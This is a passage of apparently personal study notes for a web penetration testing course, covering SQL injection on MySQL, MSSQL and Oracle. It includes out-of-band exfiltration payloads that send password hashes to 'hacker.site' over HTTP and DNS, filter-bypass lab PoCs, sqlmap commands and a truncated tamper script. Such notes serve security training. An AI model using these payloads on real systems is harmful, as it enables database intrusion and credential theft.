+<span class="k">SELECT</span> <span class="k">column_name</span> <span class="k">FROM</span> <span class="n">employees</span><span class="p">.</span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'salary'</span>
+</code></pre></div></div>
+
+<h4 id="oracle">Oracle</h4>
+<p>ts a simple query</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="p">.</span><span class="n">oracle</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">cd</span><span class="o">/</span><span class="n">B28359_01</span><span class="o">/</span><span class="n">server</span><span class="p">.</span><span class="mi">111</span><span class="o">/</span><span class="n">b28320</span><span class="o">/</span><span class="n">statviews_2105</span><span class="p">.</span><span class="n">htm</span><span class="o">#</span><span class="n">REFRN20286</span>
+
+<span class="k">SELECT</span> <span class="k">table_name</span><span class="p">,</span> <span class="n">tablespace_name</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="n">all_tables</span>
+<span class="k">SELECT</span> <span class="k">table_name</span><span class="p">,</span> <span class="n">tablespace_name</span> <span class="k">FROM</span> <span class="n">all_tables</span>
+</code></pre></div></div>
+
+<p>There is a special table in Oracle name <strong>DUAL</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://docs.oracle.com/cd/B19306_01/server.102/b14200/queries009.htm
+
+SELECT "WAPTx" FROM DUAL;
+
+# Is useful For computing a constant expression with the SELECT statement
+</code></pre></div></div>
+
+<h4 id="mssql-1">MSSQL</h4>
+<p>The system view <em>ALL_TAB_COLUMNS</em></p>
+
+<p>https://docs.oracle.com/cd/B28359_01/server.111/b28320/statviews_2091.htm</p>
+
+<p>Its useful in enumerating the columns of the tables, views and clusters accessible to the currrent user:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">column_name</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="n">ALL_TAB_COLUMNS</span>
+<span class="k">SELECT</span> <span class="k">column_name</span> <span class="k">FROM</span> <span class="n">ALL_TAB_COLUMNS</span>
+</code></pre></div></div>
+
+<h2 id="database-users-and-privileges">Database Users and Privileges</h2>
+
+<h3 id="mysql-1">MySQL</h3>
+<p>Some useful functions to do the job:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">User</span><span class="p">()</span>        <span class="o">#</span> <span class="n">FUNCTIONS</span>
+<span class="k">Current_user</span><span class="p">()</span>
+<span class="k">System_user</span><span class="p">()</span>
+<span class="k">Session_user</span><span class="p">()</span>
+<span class="k">Current_user</span>  <span class="o">#</span> <span class="n">CONSTANT</span>
+</code></pre></div></div>
+
+<p>If the user is privileged:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">user</span> <span class="k">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>The privileges are all stored in INFORMATION_SCHEMA</p>
+
+<p>And organized by the tables:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">COLUMN_PRIVILEGES</span>
+<span class="n">SCHEMA_PRIVILEGES</span>
+<span class="n">TABLE_PRIVILEGES</span><span class="p">()</span>
+<span class="n">USER_PRIVILEGES</span>
+</code></pre></div></div>
+
+<p>It can be retrieve like that:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT grantee,privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES;
+</code></pre></div></div>
+
+<p>To show privileges on databases:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT grantee, table_schema, privilege_type FROM INFORMATION_SCHEMA.SCHEMA_PRIVILEGES;
+</code></pre></div></div>
+
+<p>To show privileges from respective columns:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT user, select_priv,..., FROM MYSQL.USER;
+</code></pre></div></div>
+
+<p>To gather the DBA accounts:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">grantee</span><span class="p">,</span> <span class="n">privilege_type</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">USER_PRIVILEGES</span> <span class="k">WHERE</span> <span class="n">privilege_type</span><span class="o">=</span><span class="s1">'SUPER'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Privileged users need to change the query:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">user</span> <span class="k">FROM</span> <span class="n">MYSQL</span><span class="p">.</span><span class="k">USER</span> <span class="k">WHERE</span> <span class="n">Super_priv</span><span class="o">=</span><span class="s1">'Y'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h3 id="mssql-2">MSSQL</h3>
+<p>Its similar to mysql</p>
+
+<p>We have some functions:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">suser_sname</span><span class="p">()</span> <span class="o">//</span><span class="k">FUNCTION</span>
+<span class="k">User</span>          <span class="o">//</span> <span class="n">CONSTANTS</span>
+<span class="k">System_user</span>
+</code></pre></div></div>
+
+<p>We can also use the System Table:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">loginame</span> <span class="k">FROM</span> <span class="n">SYSPROCESSES</span> <span class="k">WHERE</span> <span class="n">spid</span> <span class="o">=</span> <span class="o">@@</span><span class="n">SPID</span>
+<span class="o">#</span> <span class="k">Current</span> <span class="k">User</span> <span class="n">Process</span> <span class="n">ID</span>
+
+<span class="o">#</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">msdn</span><span class="p">.</span><span class="n">microsoft</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">en</span><span class="o">-</span><span class="n">us</span><span class="o">/</span><span class="n">library</span><span class="o">/</span><span class="n">ms189535</span><span class="p">.</span><span class="n">aspx</span>
+
+<span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">SYSLOGINS</span><span class="p">;</span>
+<span class="o">#</span> <span class="k">all</span> <span class="n">users</span>
+</code></pre></div></div>
+
+<p>We can use System Views:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">original_login_name</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="n">DM_EXEC_SESSIONS</span> <span class="k">WHERE</span> <span class="n">status</span><span class="o">=</span><span class="s1">'running'</span>
+<span class="o">#</span> <span class="k">current</span> <span class="n">active</span> <span class="k">user</span>
+</code></pre></div></div>
+
+<p>Once we identified the users, we need to understand their privileges:</p>
+
+<p>IS_SRVOLEMEMBER = http://msdn.microsoft.com/en-us/library/ms176015.aspx</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">IF</span> <span class="n">IS_SRVOLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span>
+<span class="o">#</span> <span class="n">print</span> <span class="s1">'Current users login is a member of the sysadmin role'</span>
+
+<span class="k">ELSE</span> <span class="n">IF</span> <span class="n">IS_SRVOLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">)</span><span class="o">=</span><span class="mi">0</span>
+<span class="o">#</span> <span class="n">print</span> <span class="s1">'Current users login is NOT a member of the sysadmin role'</span>
+</code></pre></div></div>
+
+<p>In addition to sysadmin, there are other possibles roles:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>serveradmin
+dbcreator
+setupadmin
+bulkadmin
+securityadmin
+diskadmin
+public
+processadmin
+</code></pre></div></div>
+
+<p>We can use this function to ask about other users:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT IS_SRVOLEMEMBER ('processadmin','aw')
+# aw is the name of the SQL Server login to check. If the username is supplied as an argument, its the current user.
+</code></pre></div></div>
+
+<p>Whos the owner of what?</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># http://msdn.microsoft.com/en-us/library/ms174355.aspx
+
+SELECT loginname FROM SYSLOGINS where sysadmin=1
+</code></pre></div></div>
+
+<p>Or we can use System View server_principals:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT name FROM SYS.SERVER_PRINCIPALS where TYPE='S'
+# S = SQL login
+</code></pre></div></div>
+
+<h3 id="oracle-1">Oracle</h3>
+<p>To retrieve the current user:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">user</span> <span class="k">FROM</span> <span class="n">DUAL</span>
+</code></pre></div></div>
+
+<p>Alternatively:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">username</span> <span class="k">FROM</span> <span class="n">USER_USERS</span>
+<span class="k">SELECT</span> <span class="n">username</span> <span class="k">FROM</span> <span class="n">ALL_USERS</span>
+</code></pre></div></div>
+
+<p>User privileges:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">grantee</span> <span class="k">FROM</span> <span class="n">DBA_ROLE_PRIVS</span>
+<span class="k">SELECT</span> <span class="n">username</span> <span class="k">FROM</span> <span class="n">USER_ROLE_PRIVS</span>
+</code></pre></div></div>
+
+<p>The current users session privileges:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">role</span> <span class="k">FROM</span> <span class="n">SESSION_ROLES</span>
+</code></pre></div></div>
+
+<p>To retrieve an overview of all the data dictionaries, tables and view:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">DICTIONARY</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">DICT</span>
+</code></pre></div></div>
+<p>SQLI Classifications:</p>
+
+<p><img src="/assets/images/posts/ewptx/3.png" alt="Alt text" class="align-center" /></p>
+
+<p>We can infer the DBMS version by observing the replies to different concatenation syntaxes:</p>
+
+<p><img src="/assets/images/posts/ewptx/1.png" alt="Alt text" class="align-center" /></p>
+
+<p>Numeric functions:</p>
+
+<p><img src="/assets/images/posts/ewptx/2.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="out-of-band-exploitation">Out-of-Band Exploitation</h2>
+
+<p>Useful when facing Special-Blind SQL Injection scenarios. In these situations, we cannot rely on the inferential techniques to retrieve data.</p>
+
+<p>These will not work cause the results are being limited, filtered, and so forth; therefore, we need to opt For another CHANNEL to carry this information.</p>
+
+<h3 id="alternative-oob-channels">Alternative OOB CHannels</h3>
+<p>The most relevant:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP
+DNS
+email
+Database Connections
+</code></pre></div></div>
+
+<h3 id="oob-via-http">OOB via HTTP</h3>
+<p>We can leverage the HTTP channel For the DBMS systems that provide features For accessing data on the internet over HTTP using SQL</p>
+
+<ul>
+  <li>Using these features, we can create a query to a web resource controlled by the hacker and then control the access log For analyzing all the requests arrived.</li>
+  <li>Only Oracle provide this feature natively</li>
+</ul>
+
+<p>Two techniques [ Oracle ]:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UTL_HTTP
+
+# HTTPURIType: https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/t_dburi.htm#BGBGAHAA
+</code></pre></div></div>
+
+<p>Oracle URL_HTTP package
+→  https://docs.oracle.com/cd/B19306_01/appdev.102/b14258/u_http.htm</p>
+
+<ul>
+  <li>It can use both via SQL and PL/SQL</li>
+</ul>
+
+<p>Two useful funcions:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REQUEST
+REQUEST_PIECES
+</code></pre></div></div>
+
+<p>Only the REQUEST can be used in a SQL query:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">UTL_HTTP</span><span class="p">.</span><span class="n">REQUEST</span> <span class="p">(</span><span class="s1">'hacker.site/'</span><span class="o">||</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">spare4</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="k">USER</span><span class="err">$</span> <span class="k">WHERE</span> <span class="n">ROWNUM</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span> <span class="k">FROM</span> <span class="n">DUAL</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>The REQUEST_PIECES must be used within a PL/SQL Block
+*example in images</p>
+
+<p>Oracle HTTPURITYPE Package</p>
+
+<ul>
+  <li>The first one is often disabled</li>
+</ul>
+
+<p>We can also exfiltrate information via HTTP:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">HTTPURITYPE</span> <span class="p">(</span><span class="s1">'hacker.site'</span><span class="o">/||</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">spare4</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="k">USER</span><span class="err">$</span> <span class="k">WHERE</span> <span class="n">ROWNUM</span><span class="o">=</span><span class="mi">1</span><span class="p">)).</span><span class="n">getclob</span><span class="p">()</span> <span class="k">FROM</span> <span class="n">DUAL</span><span class="p">;</span>
+
+<span class="o">#</span> <span class="n">getclob</span><span class="p">()</span> <span class="k">method</span> <span class="k">returns</span> <span class="n">the</span> <span class="nb">character</span> <span class="k">large</span> <span class="k">object</span> <span class="p">(</span><span class="k">CLOB</span><span class="p">),</span> <span class="n">but</span> <span class="n">we</span> <span class="n">can</span> <span class="n">also</span> <span class="n">use</span> <span class="n">other</span> <span class="n">methods</span> <span class="n">such</span> <span class="k">as</span><span class="p">:</span> <span class="n">GETBLOB</span><span class="p">(),</span> <span class="n">GETXML</span><span class="p">()</span> <span class="k">and</span> <span class="n">GETCONTENTTYPE</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="oob-via-dns">OOB via DNS</h3>
+<p>In this context, instead of controlling the web server we have to control a DNS server.</p>
+
+<blockquote>
+  <p>Even if the administrator sets an aggressive firewall policy filtering out any outgoing connections, the victim site will still both be able to reply to requests and perform DNS queries.</p>
+</blockquote>
+
+<ul>
+  <li>The server uses a DNS resolver configured by the network administrator, but the resolver needs to contact a DNS server under the attackers control, therefore giving back the results of the injection to the attacker.</li>
+  <li>As a requirement the hacker must have access to the DNS Server.</li>
+</ul>
+
+<blockquote>
+  <p>The server must be registered as the authoritative name server For that Zone (e.g. hacker.site)</p>
+</blockquote>
+
+<p>Provoking DNS Requests</p>
+
+<h4 id="mysql-win">MySQL (win)</h4>
+
+<p>Function: LOAD_FILE() reads the file and returns the file contents as a string:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="nv">"C:</span><span class="se">\\</span><span class="nv">Windows</span><span class="se">\\</span><span class="nv">system.uni"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>We can exploit this function and provoke DNS requests by requesting a UNC path like this: \[data].hacker.site</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="n">CONCAT</span><span class="p">(</span><span class="s1">'</span><span class="se">\\\\</span><span class="s1">'</span><span class="p">,</span> <span class="s1">'SELECT password FROM mysql.user WHERE user=</span><span class="se">\'</span><span class="s1">root</span><span class="se">\'</span><span class="s1">'</span><span class="p">,</span><span class="s1">'.hacker.site'</span><span class="p">));</span>
+</code></pre></div></div>
+
+<h4 id="mssql-3">MSSQL</h4>
+<p>We can provoke DNS requests by using <strong>UNC Paths</strong> as we did with MySQL</p>
+
+<p>We can use the extended stored procedure MASTER..XP_FILEEXIST to determine whether a particular file exists on the disk or not.</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">EXEC</span> <span class="n">MASTER</span><span class="p">..</span><span class="n">XP_FILEEXIST</span> <span class="s1">'C:</span><span class="se">\W</span><span class="s1">indows</span><span class="se">\s</span><span class="s1">ystem.ini'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>2 alternatives are <strong>XP_DIRTREE</strong> and <strong>XP_SUBDIRS</strong></li>
+  <li>moreover in images</li>
+</ul>
+
+<h4 id="oracle-2">Oracle</h4>
+<p><strong>UTL_INADDR</strong> package with the functions <strong>GET_HOST_ADDRESS</strong> and <strong>GET_HOST_NAME</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">UTL_INADDR</span><span class="p">.</span><span class="n">GET_HOST_ADDRESS</span><span class="p">((</span><span class="k">SELECT</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="k">USER</span><span class="err">$</span> <span class="k">WHERE</span> <span class="n">name</span><span class="o">=</span><span class="s1">'SYS'</span><span class="p">)</span><span class="o">||</span><span class="s1">'.hacket.site'</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">DUAL</span>
+<span class="k">SELECT</span> <span class="n">UTL_INADDR</span><span class="p">.</span><span class="n">GET_HOST_NAME</span><span class="p">((</span><span class="k">SELECT</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="k">USER</span><span class="err">$</span> <span class="k">WHERE</span> <span class="n">name</span><span class="o">=</span><span class="s1">'SYS'</span><span class="p">)</span><span class="o">||</span><span class="s1">'.hacket.site'</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">DUAL</span>
+</code></pre></div></div>
+
+<p>Also functions/packages such as:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTPURITYPE</span><span class="p">.</span><span class="n">GETCLOB</span>
+<span class="n">UTL_HTTP</span><span class="p">.</span><span class="n">REQUEST</span>
+<span class="n">DBMS_LDAP</span><span class="p">.</span><span class="n">INIT</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Can be used, but depends on the version of Oracle</p>
+</blockquote>
+
+<p>It can be automated with SQLMAP</p>
+
+<p>→ http://www.slideshare.net/stamparm/dns-exfiltration-using-sqlmap-13163281</p>
+
+<h2 id="exploiting-second-order-sql-injection">Exploiting Second-Order SQL Injection</h2>
+<ul>
+  <li>Second-order SQL Injections are extremely powerful, much like their equivalent in the first-order space; However, due to their nature, they are more difficult to detect.</li>
+  <li>
+    <p>The exploit is submitted in one request and triggere when the application handles a different request.</p>
+  </li>
+  <li>Modern automated scanners are unable to perform the rigorous methodology necessaryFor discovering second-order vulnerabilities</li>
+  <li>Because there are several possible scenarios</li>
+</ul>
+
+<h3 id="lab">Lab</h3>
+<ul>
+  <li>Upload image only</li>
+  <li>go to <strong>List of file signatures</strong> in wikipedia</li>
+  <li>See the value of jpg files</li>
+</ul>
+
+<p>Try to increment the value with php code in it</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>Try to open the image uploaded, if the page has php handler it will open the phpinfo</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span> <span class="n">If</span> <span class="k">not</span><span class="p">,</span> <span class="n">procced</span> <span class="k">to</span> <span class="n">test</span> <span class="n">the</span> <span class="n">file</span> <span class="n">name</span> <span class="k">with</span> <span class="n">BURP</span> <span class="o">&gt;</span> <span class="n">Repeater</span>
+<span class="n">filename</span><span class="o">=</span><span class="nv">"example.php' and true -- -"</span>
+
+<span class="o">#</span> <span class="n">If</span> <span class="n">the</span> <span class="n">number</span> <span class="k">of</span> <span class="k">view</span> <span class="n">increase</span><span class="p">,</span> <span class="n">lets</span> <span class="n">try</span> <span class="k">with</span> <span class="k">UNION</span> <span class="n">this</span> <span class="nb">time</span>
+<span class="n">filename</span><span class="o">=</span><span class="nv">"example.php' UNION SELECT @@VERSION; -- -"</span>
+<span class="n">filename</span><span class="o">=</span><span class="nv">"' UNION SELECT @@VERSION; -- -"</span> <span class="o">//</span><span class="n">take</span> <span class="k">off</span> <span class="n">the</span> <span class="n">name</span> <span class="k">of</span> <span class="n">the</span> <span class="n">file</span>
+<span class="n">filename</span><span class="o">=</span><span class="nv">"' UNION SELECT SCHEMA(); -- -"</span>
+<span class="n">filename</span><span class="o">=</span><span class="nv">"' UNION SELECT GROUP_CONCAT(table_name) from information_schema.tables where table_schema = SCHEMA(); -- -"</span>
+</code></pre></div></div>
+
+<p>Our scenario:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[&gt;] Injection
+Name of the file uploaded, e.g. ' union select @version; -- -
+** via POST request **
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Execution
+view.php?file={our_payload}
+** via GET request **
+</code></pre></div></div>
+
+<p>Downsides:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap (2nd order) works only GET to GET i.e. we beed a python plugin
+burp needs a java plugin
+</code></pre></div></div>
+
+<p>Upsides:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>out php script
+
+1. GETs the payload in input
+2. Generates the respective image payload (POST req)
+3. Generates the respective GET req, to view page and reflect the result client-side
+</code></pre></div></div>
+
+<ul>
+  <li>So we create a php page, opened with apache2 server to execute payloads</li>
+</ul>
+
+<p>Example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hacker.site/payload.php?payload='UNION SELECT USER(); -- -
+</code></pre></div></div>
+
+<p>Finish the job with SQLMAP</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'http://hacker.site/payload.php?payload=x'</span> <span class="c1">--technique=U --banner</span>
+
+<span class="c1">--flush-session --batch --banner</span>
+<span class="o">#</span> <span class="n">test</span> <span class="n">the</span> <span class="nb">time</span> <span class="n">difference</span> <span class="k">between</span> <span class="nb">Time</span><span class="o">-</span><span class="n">based</span> <span class="k">and</span> <span class="k">Union</span><span class="o">-</span><span class="n">based</span>
+<span class="o">#</span> <span class="nb">Time</span> <span class="mi">0</span> <span class="k">is</span> <span class="mi">3</span><span class="k">min</span> <span class="n">long</span><span class="p">,</span> <span class="k">Union</span> <span class="k">is</span> <span class="mi">2</span><span class="n">sec</span>
+</code></pre></div></div>
+
+<p>We need to pre-elaborate the form before submitting the request.</p>
+
+<h2 id="lab-solutions">Lab Solutions</h2>
+
+<h3 id="sqli-1">SQLi 1</h3>
+<p>PoC:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+Host: 1.sqli.labs
+User-Agent: <span class="s1">' UNION SELECT user(); -- -
+</span></code></pre></div></div>
+
+<p>SQLMap Automation:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -u 'http://1.sqli.labs/' -p user-agent --random-agent --banner
+</code></pre></div></div>
+
+<h3 id="sqli-2">SQLi 2</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UNION and standard payloads like <span class="nv">1</span><span class="o">=</span><span class="s1">'1 are filterer.
+
+PoC, False Blind:
+GET / HTTP/1.1
+Host: 2.sqli.labs
+User-Agent: '</span> or <span class="s1">'elscustom'</span><span class="o">=</span><span class="s1">'elsFALSE
+
+
+PoC, True Blind:
+GET / HTTP/1.1
+Host: 2.sqli.labs
+User-Agent: '</span> or <span class="s1">'elscustom'</span><span class="o">=</span><span class="s1">'elscustom
+
+
+# SQLMap Automation:
+sqlmap -u '</span>http://2.sqli.labs/<span class="s1">' -p user-agent --user-agent=elsagent --technique=B --banner
+</span></code></pre></div></div>
+
+<h3 id="sqli-3">SQLi 3</h3>
+<p>Spaces are filtered.</p>
+
+<p>PoC:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+Host: 3.sqli.labs
+User-Agent: <span class="s1">'/**/UNION/**/SELECT/**/@@version;#
+
+# SQLMap Automation:
+sqlmap -u '</span>http://3.sqli.labs/<span class="s1">' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix='</span><span class="p">;</span><span class="c">#' --union-char=els --banner</span>
+</code></pre></div></div>
+
+<h3 id="sqli-4">SQLi 4</h3>
+<p>Comments non longer work.</p>
+
+<p>PoC:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+Host: 4.sqli.labs
+User-Agent: <span class="s1">'UNION(select('</span>PoC String<span class="s1">'));#
+
+
+# We cannot easily automate this task, as sqlmap should balance the parentesis.
+# To exploit by hand you have to first find the tables in the current database:
+
+
+GET / HTTP/1.1
+Host: 4.sqli.labs
+User-Agent: '</span>union<span class="o">(</span>SELECT<span class="o">(</span>group_concat<span class="o">(</span>table_name<span class="o">))</span>FROM<span class="o">(</span>information_schema.columns<span class="o">)</span>where<span class="o">(</span><span class="nv">table_schema</span><span class="o">=</span>database<span class="o">()))</span><span class="p">;</span><span class="c">#</span>
+
+Then you can enumarate the columns:
+
+GET / HTTP/1.1
+Host: 4.sqli.labs
+User-Agent: <span class="s1">'union(SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='</span>secretcustomers<span class="s1">'));#
+</span></code></pre></div></div>
+
+<h3 id="sqli-5">SQLi 5</h3>
+<p>This is similar to SQLi 4, but the developer used doublequotes around strings.</p>
+
+<p>PoC:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+Host: 5.sqli.labs
+User-Agent: <span class="s2">"UNION(select('PoC String'));#
+
+# To exploit by hand you have again to find the tables in the current database:
+
+GET / HTTP/1.1
+Host: 5.sqli.labs
+User-Agent: "</span>union<span class="o">(</span>SELECT<span class="o">(</span>group_concat<span class="o">(</span>table_name<span class="o">))</span>FROM<span class="o">(</span>information_schema.columns<span class="o">)</span>where<span class="o">(</span><span class="nv">table_schema</span><span class="o">=</span>database<span class="o">()))</span><span class="p">;</span><span class="c">#</span>
+</code></pre></div></div>
+
+<h3 id="sqli-6">SQLi 6</h3>
+<p>MySQL’s reserved words have been filtered. Using <strong>RaNDom</strong> case does not help, as you can have, for example, somethin like <em>InfoRMaTIon_ScheMa</em> who will become <em>InfoRMaTI_ScheMa</em>, as <em>on</em> or <em>ON</em> is a valid reserved word.</p>
+
+<p>PoC:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+GET / HTTP/1.1
+Host: 6.sqli.labs
+User-Agent: <span class="s1">' UNiOn seLect @@versiOn;#
+
+The only way to get around this kind of filtering during the exploitation automation phase is to use DifFeReNt CaSe for every letter
+You have to write a simple tampering script:
+</span></code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">from</span> <span class="n">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
+
+<span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="p">.</span><span class="n">NORMAL</span>
+
+<span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
+    <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="sh">"""</span><span class="s">
+    Replaces each keyword with a CaMeLcAsE VeRsIoN of it.
+</span><span class="gp">
+    &gt;&gt;&gt;</span> <span class="nf">tamper</span><span class="p">(</span><span class="sh">'</span><span class="s">INSERT</span><span class="sh">'</span><span class="p">)</span>
+    <span class="sh">'</span><span class="s">InSeRt</span><span class="sh">'</span>
+    <span class="sh">"""</span>
+
+    <span class="n">ret_val</span> <span class="o">=</span> <span class="sh">""</span>
+
+    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
+            <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="c1"># We cannot break 0x12345
+</span>                <span class="k">if</span> <span class="ow">not</span> <span class="p">((</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">)):</span>
